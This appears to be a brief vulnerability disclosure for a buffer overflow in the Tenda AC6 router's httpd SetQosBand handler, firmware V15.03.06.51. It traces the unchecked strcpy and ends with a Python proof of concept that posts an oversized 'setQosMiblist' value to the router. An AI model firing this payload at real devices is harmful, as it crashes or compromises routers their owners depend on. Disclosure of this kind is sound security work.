# buffer overflow

## Tenda_AC6

version: V15.03.06.51

## Description:

There is a buffer overflow in httpd/SetQosBand

## Source:

you may download it from : https://www.tendacn.com/download/detail-3794.html

## Analyse:


![](../Tenda_AC10U_V1/9.png)

get value from list ,send to setQosMiblist

![](../Tenda_AC10U_V1/10.png)

p eaqul list, if list contains '\n', get into if ,finally call strcpy, cause buff overflow



## POC
```
url = "http://192.168.1.13/goform/SetQosBand"
payload = 'A'*0x1000 + '\n'

r = requests.post(url, data={'setQosMiblist': payload})
``` 
